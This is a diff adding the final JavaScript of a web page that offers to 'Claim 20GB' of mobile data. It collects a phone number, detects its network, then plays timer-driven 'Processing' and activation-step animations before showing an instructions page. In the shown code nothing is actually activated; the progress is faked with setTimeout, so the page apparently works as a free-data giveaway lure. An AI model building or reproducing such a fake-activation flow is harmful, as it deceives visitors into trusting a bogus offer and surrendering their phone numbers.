+                        actStep2.querySelector('.step-num').innerHTML = '<i class="fas fa-check"></i>';
+                    }, 500);
+                }, 1800);
+
+                setTimeout(() => {
+                    actStep3.classList.add('active');
+                    setTimeout(() => {
+                        actStep3.classList.add('done');
+                        actStep3.querySelector('.step-num').innerHTML = '<i class="fas fa-check"></i>';
+                    }, 500);
+                }, 2900);
+
+                setTimeout(() => {
+                    showPage('pageInstructions');
+                }, 4000);
+            }
+
+            // ===== HANDLE CHECK =====
+            function handleCheck() {
+                const raw = phoneInput.value.trim();
+                if (!raw) {
+                    errorText.textContent = 'Please enter a phone number.';
+                    errorMsg.classList.add('show');
+                    return;
+                }
+
+                const network = detectNetwork(raw);
+                if (!network) {
+                    errorText.textContent = 'Number not recognized. Please check and try again.';
+                    errorMsg.classList.add('show');
+                    return;
+                }
+
+                errorMsg.classList.remove('show');
+                currentPhone = raw;
+                currentNetwork = network;
+                runLoadingAnimation(raw, network);
+            }
+
+            // ===== CONFIRM =====
+            function handleConfirm() {
+                confirmBtn.disabled = true;
+                confirmBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+                runConfirmLoading();
+            }
+
+            // ===== ACTIVATE =====
+            function handleActivate() {
+                runActivationLoading();
+            }
+
+            // ===== DONE (Instructions) =====
+            function handleInstructionsDone() {
+                showPage('pageMain');
+                confirmBtn.disabled = false;
+                confirmBtn.innerHTML = '<i class="fas fa-thumbs-up"></i> Confirm & Claim 20GB';
+                [actStep1, actStep2, actStep3].forEach(s => {
+                    s.classList.remove('active', 'done');
+                    s.querySelector('.step-num').innerHTML = s.id === 'actStep1' ? '1' : s.id === 'actStep2' ? '2' :
+                        '3';
+                });
+                // Clear progress cookie after completion
+                setCookie('dataWalletProgress', {}, -1);
+            }
+
+            // ===== EVENT LISTENERS =====
+            checkBtn.addEventListener('click', handleCheck);
+
+            phoneInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    handleCheck();
+                }
+            });
+
+            phoneInput.addEventListener('input', () => {
+                errorMsg.classList.remove('show');
+            });
+
+            confirmBtn.addEventListener('click', handleConfirm);
+            activateBtn.addEventListener('click', handleActivate);
+            instructionsDoneBtn.addEventListener('click', handleInstructionsDone);
+
+            // ===== RESTORE PROGRESS ON LOAD =====
+            const restored = restoreProgress();
+
+            // If not restored, clear any stale data
+            if (!restored) {
+                // Ensure we start fresh
+                setCookie('dataWalletProgress', {}, -1);
+            }
+
+        })();
+    </script>
+
+</body>
+</html>
